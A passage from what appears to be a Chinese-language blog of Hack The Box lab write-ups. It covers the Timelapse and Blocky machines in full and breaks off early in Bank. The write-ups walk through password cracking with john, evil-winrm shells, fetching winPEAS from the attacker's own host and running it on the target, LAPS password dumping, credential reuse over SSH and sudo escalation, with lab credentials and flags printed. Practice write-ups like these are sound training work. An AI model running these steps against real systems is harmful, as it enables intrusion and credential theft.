(0.55s latency).\nNot shown: 65525 filtered ports\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-29 14:19:01Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n| ssl-cert: Subject: commonName=dc01.timelapse.htb\n| Not valid before: 2021-10-25T14:05:29\n|_Not valid after:  2022-10-25T14:25:29\n|_ssl-date: 2022-03-29T14:21:28+00:00; +7h59m58s from scanner time.\n| tls-alpn: \n|_  http/1.1\n9389/tcp  open  mc-nmf        .NET Message Framing\n49674/tcp open  msrpc         Microsoft Windows RPC\n51354/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2022-03-29T14:20:18\n|_  start_date: N/A\n\nTRACEROUTE (using port 135/tcp)\nHOP RTT       ADDRESS\n1   556.15 ms 10.10.16.1\n2   556.22 ms 10.10.11.152\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 196.57 seconds\n```\n## Smb\n这台机器明显有 smb，先去找一下 guest 用户的票据\n\n```bash\nenum4linux -a -u \"guset\" -p \"\" 10.10.11.152\n\n[+] Attempting to map shares on 10.10.11.152\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.\n//10.10.11.152/ADMIN$   Mapping: DENIED, Listing: N/A\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.\n//10.10.11.152/C$       Mapping: DENIED, Listing: N/A\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.\n//10.10.11.152/IPC$     [E] Can't understand response:\nNT_STATUS_INVALID_INFO_CLASS listing \\*\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.\n//10.10.11.152/NETLOGON Mapping: OK     Listing: DENIED\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.\n//10.10.11.152/Shares   Mapping: OK, Listing: OK\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.\n//10.10.11.152/SYSVOL   Mapping: OK     Listing: DENIED\n```\n该 Shares 文件夹可供阅读，让我们看看里面有些什么\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# smbclient -U \"guest\" //10.10.11.152/Shares \nEnter WORKGROUP\\guest's password: \nTry \"help\" to get a list of possible commands.\nsmb: \\> dir\n  .                                   D        0  Mon Oct 25 11:39:15 2021\n  ..                                  D        0  Mon Oct 25 11:39:15 2021\n  Dev                                 D        0  Mon Oct 25 15:40:06 2021\n  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021\n\n                6367231 blocks of size 4096. 2323752 blocks available\n```\n有两个文件夹，去挨个查询一下\n\n```bash\nsmb: \\> cd Dev\nsmb: \\Dev\\> dir\n  .                                   D        0  Mon Oct 25 15:40:06 2021\n  ..                                  D        0  Mon Oct 25 15:40:06 2021\n  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021\n\n                6367231 blocks of size 4096. 2323752 blocks available\n```\nDev 目录下有一个 winrm\\_backup.zip 压缩文件，下载下来看看\n\n```bash\nsmb: \\Dev\\> get winrm_backup.zip \ngetting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)\n```\n## John\n下载下来了，去查看一下\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# unzip winrm_backup.zip \nArchive:  winrm_backup.zip\n[winrm_backup.zip] legacyy_dev_auth.pfx password:\n```\n需要解压密码，咱们没有啊，使用 john 尝试爆破一下\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# zip2john winrm_backup.zip > hash\nver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683\n\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash    \nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nsupremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)\n1g 0:00:00:00 DONE (2022-03-29 21:46) 3.333g/s 11578Kp/s 11578Kc/s 11578KC/s surfroxy154..supergay01\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n```\n解压密码是 supremelegacy 去解压一下\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# unzip winrm_backup.zip \nArchive:  winrm_backup.zip\n[winrm_backup.zip] legacyy_dev_auth.pfx password: \n  inflating: legacyy_dev_auth.pfx\n```\n# 漏洞利用\n解压出来后有一个 pfx 文件，查询了一下 pfx 可以使用 openssl 提取出私钥，去提取一下\n\n> [https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key\nEnter Import Password:\nMac verify error: invalid password?\n```\n提取时发现也需要密码，使用刚才 zip 爆破出来的密码尝试失败，再去爆破一下\n\n```bash\n    ┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# pfx2john legacyy_dev_auth.pfx > hashbis \n\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt hashbis \nUsing default input encoding: UTF-8\nLoaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])\nCost 1 (iteration count) is 2000 for all loaded hashes\nCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nthuglegacy       (legacyy_dev_auth.pfx)     \n1g 0:00:01:58 DONE (2022-03-29 21:53) 0.008414g/s 27189p/s 27189c/s 27189C/s thuglife06..thug211\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n爆破出来密码 thuglegacy，然后再去提取一下\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -out prv.key          \nEnter Import Password:\nEnter PEM pass phrase:\nVerifying - Enter PEM pass phrase:\n\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt\nEnter Import Password:\n\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# ls\ncert.crt  hash  hashbis  legacyy_dev_auth.pfx  nmap  prv.key  winrm_backup.zip\n```\n使用 evil-winrm 进行利用\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nWarning: SSL enabled\n\nInfo: Establishing connection to remote endpoint\n\nEnter PEM pass phrase:\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents> whoami\ntimelapse\\legacyy\n```\n成功拿到一个 user 权限\n\n```bash\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents> type 'C:\\Users\\legacyy\\Desktop\\user.txt'\n622218eb92f1c85ad186d6aee0dbdb53\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n在本地开启一个 HTTP 服务\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# python3 -m http.server 80                                    \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n使用 powershell 下载我们本地的 winPEAS.exe 辅助提权脚本\n\n```bash\npowershell \"Invoke-WebRequest -UseBasicParsing 10.10.16.4/winPEASx64.exe -OutFile winPEASx64.exe\"\n```\n然后运行\n\n```bash\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents> powershell \"Invoke-WebRequest -UseBasicParsing 10.10.16.4/winPEASx64.exe -OutFile winPEASx64.exe\"\n*Evil-WinRM* PS C:\\Users\\legacyy\\Documents> ./winPEASx64.exe\n```\n```bash\nÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings\n    PowerShell v2 Version: 2.0\n    PowerShell v5 Version: 5.1.17763.1\n    PowerShell Core Version: \n    Transcription Settings: \n    Module Logging Settings: \n    Scriptblock Logging Settings: \n    PS history file: C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n    PS history size: 434B\n```\n发现了一个包含历史命令记录的文件，下载下来\n\n```bash\ndownload C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n```\n然后查看一下\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# cat ConsoleHost_history.txt                                                                         \nwhoami\nipconfig /all\nnetstat -ano |select-string LIST\n$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck\n$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force\n$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)\ninvoke-command -computername localhost -credential $c -port 5986 -usessl -\nSessionOption $so -scriptblock {whoami}\nget-aduser -filter * -properties *\nexit\n```\n尝试使用 laps.py 来进行操作\n\n> [https://github.com/n00py/LAPSDumper/blob/main/laps.py](https://github.com/n00py/LAPSDumper/blob/main/laps.py)\n\n首先将添加一个本地 DNS 解析\n\n```bash\necho 10.10.11.152 timelapse.htb >> /etc/hosts\n```\n然后执行\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb\nDC01$:C9(3OIh923TK13J.iADjN))A\n```\n拿到了一个密码\n\n继续使用 evil-winrm 登录\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Timelapse]\n└─# evil-winrm -i 10.10.11.152 -S -u Administrator -p 'C9(3OIh923TK13J.iADjN))A' \n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nWarning: SSL enabled\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\ntimelapse\\administrator\n```\n成功拿到一个 administrator 权限\n\n```bash\n*Evil-WinRM* PS C:\\users\\TRX\\Desktop> cat root.txt\n365b8463a586a128c09558558d4deceb\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Blocky - Hackthebox","url":"/2022/03/31/Hackthebox/Easy/Hackthebox-Blocky/","content":"\n# Hackthebox - Blocky\n# 靶场信息\n![](Hackthebox-Blocky/c31330a6-fc78-4530-a275-fd8c53ba0249.png)\n\n# 靶场类型\n![](Hackthebox-Blocky/ae3178d1-6c0e-493b-91ca-166879694505.png)\n\n# 信息搜集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Blocky]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.37\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 23:15 EDT\nNmap scan report for 10.10.10.37\nHost is up (0.46s latency).\nNot shown: 65530 filtered ports\nPORT      STATE  SERVICE   VERSION\n21/tcp    open   ftp       ProFTPD 1.3.5a\n22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)\n|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)\n|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)\n80/tcp    open   http      Apache httpd 2.4.18 ((Ubuntu))\n|_http-generator: WordPress 4.8\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: BlockyCraft – Under Construction!\n8192/tcp  closed sophos\n25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)\nDevice type: general purpose|WAP|specialized|storage-misc|printer\nRunning (JUST GUESSING): Linux 3.X|4.X|2.6.X (94%), Asus embedded (90%), Crestron 2-Series (88%), HP embedded (88%)\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:linux:linux_kernel:3.4\nAggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.13 or 4.2 (94%), Linux 4.2 (94%), Linux 4.4 (94%), Linux 3.13 (93%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.12 (90%), Linux 3.18 (90%), Linux 3.2 - 4.9 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8192/tcp)\nHOP RTT       ADDRESS\n1   535.09 ms 10.10.16.1\n2   535.21 ms 10.10.10.37\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 163.96 seconds\n```\n这台有点意思，看起来像是 Minectfat（我的世界）这款游戏的一台服务器\n\n## Http\n![](Hackthebox-Blocky/41a84187-1681-4020-9dda-b7ac2d985bb3.png)\n\n这台有点意思的，往下翻可以看到是 wordpress 搭建的，去做个 wpscan\n\n## WPScan\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# wpscan --url http://10.10.10.37/\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.17\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://10.10.10.37/ [10.10.10.37]\n[+] Started: Mon Mar 28 23:21:07 2022\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.10.37/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://10.10.10.37/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] Upload directory has listing enabled: http://10.10.10.37/wp-content/uploads/\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://10.10.10.37/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).\n | Found By: Rss Generator (Passive Detection)\n |  - http://10.10.10.37/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>\n |  - http://10.10.10.37/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>\n\n[+] WordPress theme in use: twentyseventeen\n | Location: http://10.10.10.37/wp-content/themes/twentyseventeen/\n | Last Updated: 2022-01-25T00:00:00.000Z\n | Readme: http://10.10.10.37/wp-content/themes/twentyseventeen/README.txt\n | [!] The version is out of date, the latest version is 2.9\n | Style URL: http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8\n | Style Name: Twenty Seventeen\n | Style URI: https://wordpress.org/themes/twentyseventeen/\n | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 1.3 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://10.10.10.37/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:20 <=====================================================================================================================================> (137 / 137) 100.00% Time: 00:00:20\n\n[i] No Config Backups Found.\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Mon Mar 28 23:21:31 2022\n[+] Requests Done: 139\n[+] Cached Requests: 37\n[+] Data Sent: 34.403 KB\n[+] Data Received: 19.875 KB\n[+] Memory used: 224.391 MB\n[+] Elapsed time: 00:00:23\n```\n没看到什么特别明显的可用的漏洞，去 fuzz 一下目录看看\n\n## Fuzz\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.10.37/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.37/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nwp-includes             [Status: 301, Size: 316, Words: 20, Lines: 10]\nwp-content              [Status: 301, Size: 315, Words: 20, Lines: 10]\nplugins                 [Status: 301, Size: 312, Words: 20, Lines: 10]\nwp-admin                [Status: 301, Size: 313, Words: 20, Lines: 10]\njavascript              [Status: 301, Size: 315, Words: 20, Lines: 10]\nwiki                    [Status: 301, Size: 309, Words: 20, Lines: 10]\nphpmyadmin              [Status: 301, Size: 315, Words: 20, Lines: 10]\nserver-status           [Status: 403, Size: 299, Words: 22, Lines: 12]\n                        [Status: 200, Size: 52256, Words: 3306, Lines: 314]\n:: Progress: [20116/20116] :: Job [1/1] :: 70 req/sec :: Duration: [0:12:10] :: Errors: 6 ::\n```\n有一个 phpmyadmin 目录，去尝试一下\n\n![](Hackthebox-Blocky/53fe3cb9-feec-4e0a-a318-9fc458b8a1fe.png)\n\n使用默认口令登录失败\n\n# 漏洞利用\n## 漏洞发现\n然后看到有一个 plugins 目录，去看看插件\n\n![](Hackthebox-Blocky/98f1bc6d-53ba-43e7-8571-8d41e0394df9.png)\n\n这里有一个 BlockyCore.jar 下载下来看看\n\n```bash\n┌──(root💀kali)-[~/…/HTB/Easy/Blocky/BlockyCore]\n└─# ls\nBlockyCore.jar\n\n┌──(root💀kali)-[~/…/HTB/Easy/Blocky/BlockyCore]\n└─# unzip BlockyCore.jar\nArchive:  BlockyCore.jar\n  inflating: META-INF/MANIFEST.MF    \n  inflating: com/myfirstplugin/BlockyCore.class  \n\n┌──(root💀kali)-[~/…/HTB/Easy/Blocky/BlockyCore]\n└─# ls\nBlockyCore.jar  com  META-INF\n\n┌──(root💀kali)-[~/…/HTB/Easy/Blocky/BlockyCore]\n└─# cd com                   \n\n┌──(root💀kali)-[~/…/Easy/Blocky/BlockyCore/com]\n└─# ls -la\n总用量 12\ndrwxr-xr-x 3 root root 4096  3月 29 00:25 .\ndrwxr-xr-x 4 root root 4096  3月 29 00:25 ..\ndrwxr-xr-x 2 root root 4096  3月 29 00:25 myfirstplugin\n\n┌──(root💀kali)-[~/…/Easy/Blocky/BlockyCore/com]\n└─# cd myfirstplugin   \n\n┌──(root💀kali)-[~/…/Blocky/BlockyCore/com/myfirstplugin]\n└─# ls -la\n总用量 12\ndrwxr-xr-x 2 root root 4096  3月 29 00:25 .\ndrwxr-xr-x 3 root root 4096  3月 29 00:25 ..\n-rw-r--r-- 1 root root  939  7月  2  2017 BlockyCore.class\n```\n解压出来了，去使用 java 的反编译器 jd-gui 查看一下\n\n```bash\napt install jd-gui\n```\n安装 jd-gui\n\n![](Hackthebox-Blocky/6aeabe89-19dd-4353-a060-64b3329b2dc7.png)\n\n```bash\npackage com.myfirstplugin;\n\npublic class BlockyCore {\n  public String sqlHost = \"localhost\";\n\n  public String sqlUser = \"root\";\n\n  public String sqlPass = \"8YsqfCTnvxAUeduzjNSXe22\";\n\n  public void onServerStart() {}\n\n  public void onServerStop() {}\n\n  public void onPlayerJoin() {\n    sendMessage(\"TODO get username\", \"Welcome to the BlockyCraft!!!!!!!\");\n  }\n\n  public void sendMessage(String username, String message) {}\n}\n```\n使用 jd-gui 打开 BlockyCore.class 后，我们可以看到有一个 sql 的账号和密码\n\n正好我们有 phpmyadmin 去登陆一下\n\n![](Hackthebox-Blocky/c57c59ba-643b-4b47-87f2-b0e3e0d59894.png)\n\n登录成功\n\n既然这个账号可以登录 sql 数据库，那证明肯定是一个系统账户，那我们是否可用这个系统账户进行登录 ssh 呢？去尝试一下\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh root@10.10.10.37                                           \nThe authenticity of host '10.10.10.37 (10.10.10.37)' can't be established.\nECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.37' (ECDSA) to the list of known hosts.\nroot@10.10.10.37's password: \nPermission denied, please try again.\nroot@10.10.10.37's password: \nPermission denied, please try again.\nroot@10.10.10.37's password:\n```\n登录失败了，那是否是其他账号的呢？我们目前也没有其他账号，去获取一下\n\n## 账号获取\n![](Hackthebox-Blocky/f6636e40-9f90-4ade-bf9d-ec295cba812c.png)\n\n首先可以看到唯一一篇文章的发布人是 NOTCH（Minecraft 这款游戏的创始人）\n\n那他很可能就是一个账号，同时我们去数据库内也看一下\n\n![](Hackthebox-Blocky/ce9c4053-514e-45fc-bf3d-8ad04af879fa.png)\n\n在数据库内也可以看到，只有 NOTCH 这一个账号，我想应该就是了，去尝试一下吧\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh notch@10.10.10.37                                                                                                                                                                                     130 ⨯\nnotch@10.10.10.37's password: \nWelcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n7 packages can be updated.\n7 updates are security updates.\n\nLast login: Sun Dec 24 09:34:35 2017\nnotch@Blocky:~$ whoami&&id\nnotch\nuid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)\n```\n登录成功\n\n```bash\nnotch@Blocky:~$ cat user.txt \n59fee0977fb60b8a0bc6e41e751f3cd5\n```\n成功获得 user 权限的 flag 文件\n\n# 权限提升\n```bash\nnotch@Blocky:~$ sudo -l\n[sudo] password for notch: \nMatching Defaults entries for notch on Blocky:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser notch may run the following commands on Blocky:\n    (ALL : ALL) ALL\n```\n查看一下 sudo -l，我们的 NOTCH 账户拥有所有权限，那直接提权吧\n\n```bash\nnotch@Blocky:~$ sudo su\nroot@Blocky:/home/notch# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功提权到 root 权限\n\n```bash\nroot@Blocky:/home/notch# cat /root/root.txt \n0a9694a5b4d272c694679f7860f1cd5f\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Bank - Hackthebox","url":"/2022/03/30/Hackthebox/Easy/Hackthebox-Bank/","content":"\n# Hackthebox - Bank\n# 靶场信息\n![](Hackthebox-Bank/9389a965-ea28-4096-a234-c29cd50f0674.png)\n\n# 靶场类型\n![](Hackthebox-Bank/06b06f3b-8f61-467f-90ab-5d23d93c8e5f.png)\n\n# 信息搜集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Bank]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.29\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-03-28 01:51 EDT\nNmap scan report for 10.10.10.29\nHost is up (0.53s latency).\nNot shown: 63750 filtered ports, 1782 closed ports\nPORT   STATE SERVICE    VERSION\n22/tcp open  tcpwrapped\n| ssh-hostkey: \n|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)\n|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)\n|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)\n|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)\n53/tcp open  tcpwrapped\n| dns-nsid: \n|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu\n80/tcp open  tcpwrapped\n|_http-server-header: Apache/2.4.7 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=3/28%OT=80%CT=7%CU=30511%PV=Y%DS=2%DC=T%G=Y%TM=62414DA\nOS:A%P=x86_64-pc-linux-gnu)SEQ(CI=I)SEQ(SP=105%GCD=1%ISR=107%TI=Z%II=I%TS=8\nOS:)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8)OPS(O1=M54BST11NW7%O2=M54B\nOS:ST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)WIN(W1\nOS:=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%TG=40%W=7210%\nOS:O=M54BNNSNW7%CC=Y%Q=)ECN(R=Y%DF=Y%T=40%W=7210%O=M54BNNSNW7%CC=Y%Q=)T1(R=\nOS:Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q\nOS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y\nOS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%\nOS:RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%\nOS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T\nOS:7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%